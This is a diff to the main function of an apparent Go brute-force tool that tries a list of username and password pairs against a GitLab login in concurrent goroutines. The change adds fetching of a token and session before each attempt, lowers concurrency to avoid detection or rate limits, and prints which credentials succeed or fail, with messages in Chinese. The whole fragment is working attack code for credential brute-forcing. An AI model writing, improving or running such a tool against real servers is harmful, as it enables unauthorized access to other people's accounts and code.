@@ -52,8 +52,11 @@ func main() {
 	var wg sync.WaitGroup
 
 	// 创建一个最大5的协程数的通道
-	limit := make(chan struct{}, 20)
-	//fmt.Println(res)
+	limit := make(chan struct{}, 2)
+	fmt.Println()
+	fmt.Println(len(res))
+	TS, _ := brute.GetTokenAndSession(url)
+	fmt.Println(TS)
 	for _, key := range res {
 		wg.Add(1)
 		// 尝试向通道添加一个新的值
@@ -61,17 +64,17 @@ func main() {
 		go func(key Data.Author) {
 			defer wg.Done()
 			//开始代码块
-			_, err := brute.LoginToGitLab(url, key.Username, key.Password)
-			if err != nil {
+			_, loginErr := brute.LoginToGitLab(url, key.Username, key.Password, TS)
+			if loginErr != nil {
 				//println(err.Error())
 				fmt.Printf("登录失败 %v %v                 \r", key.Username, key.Password)
 			} else {
-				fmt.Printf("\n登录成功 %v %v                 \n", key.Username, key.Password)
+				fmt.Printf("\n登录成功 %v %v                          \n", key.Username, key.Password)
 			}
 			//结束代码块
 			<-limit
 		}(key)
 
 	}
-
+	wg.Wait()
 }
